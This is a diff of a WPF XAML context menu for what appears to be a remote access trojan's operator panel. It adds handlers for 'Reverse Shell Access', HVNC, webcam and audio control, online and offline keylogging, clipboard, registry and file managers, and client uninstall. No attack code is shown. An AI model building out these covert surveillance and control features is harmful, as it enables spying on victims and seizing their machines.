@@ -8,43 +8,48 @@
              d:DesignHeight="748" d:DesignWidth="1230">
 
     <UserControl.Resources>
-        <!-- Style for the DataGrid -->
         <ContextMenu x:Key="utilityContextMenu" Opened="ContextMenu_Opened">
             <MenuItem Header="System Info" Click="SystemInfo_Click"/>
             <MenuItem Header="Notes" Click="Notes_Click"/>
             <MenuItem Header="Reverse Shell Access" Click="ReverseShell_Click"/>
             <Separator/>
             <MenuItem Header="Control">
-                <MenuItem Header="Webcam Control" Click="WebcamControl_Click"/>
                 <MenuItem Header="Remote Desktop" Click="RemoteDesktop_Click"/>
+                <MenuItem Header="Webcam Control" Click="WebcamControl_Click"/>
                 <MenuItem Header="Audio Manager" Click="AudioManager_Click"/>
                 <MenuItem Header="HVNC" Click="HVNC_Click"/>
-                <MenuItem Header="Key Logger" Click="KeyLogger_Click"/>
+                <MenuItem Header="Keylogger">
+                    <MenuItem Header="Offline" Click="KeyloggerOffline_Click" />
+                    <MenuItem Header="Online" Click="KeyloggerOnline_Click" />
+                </MenuItem>
             </MenuItem>
             <MenuItem Header="Management">
+                <MenuItem Header="System Management" Click="SystemManagement_Click"/>
+                <MenuItem Header="Network Management" Click="NetworkManagement_Click"/>
                 <MenuItem Header="File Manager" Click="FileManager_Click"/>
                 <MenuItem Header="Registry Manager" Click="RegistryManager_Click"/>
+                <MenuItem Header="Clipboard Manager" Click="ClipboardManager_Click"/>
             </MenuItem>
             <Separator/>
-            <MenuItem Header="Recovery"/>
-            <MenuItem Header="System Options"/>
-            <MenuItem Header="Miscellaneous"/>
+            <MenuItem Header="Recovery" Click="Recovery_Click"/>
+            <MenuItem Header="System Options" Click="SystemOptions_Click"/>
+            <MenuItem Header="Miscellaneous" Click="Miscellaneous_Click"/>
             <Separator/>
             <MenuItem Header="System Controls">
-                <MenuItem Header="Reconnect"/>
-                <MenuItem Header="Disconnect"/>
-                <MenuItem Header="Uninstall"/>
+                <MenuItem Header="Reconnect" Click="Reconnect_Click"/>
+                <MenuItem Header="Disconnect" Click="Disconnect_Click"/>
+                <MenuItem Header="Uninstall" Click="Uninstall_Click"/>
             </MenuItem>
             <MenuItem Header="Power">
-                <MenuItem Header="Shutdown"/>
-                <MenuItem Header="Restart"/>
-                <MenuItem Header="Hibernate"/>
-                <MenuItem Header="Sleep"/>
-                <MenuItem Header="Logoff"/>
+                <MenuItem Header="Shutdown" Click="Shutdown_Click"/>
+                <MenuItem Header="Restart" Click="Restart_Click"/>
+                <MenuItem Header="Sleep" Click="Sleep_Click"/>
+                <MenuItem Header="Logoff" Click="Logoff_Click"/>
+                <MenuItem Header="Hibernate" Click="Hibernate_Click"/>
             </MenuItem>
         </ContextMenu>
 
-
+        <!-- Style for the DataGrid -->
         <Style TargetType="DataGrid">
             <Setter Property="AutoGenerateColumns" Value="False" />
             <Setter Property="CanUserAddRows" Value="False" />
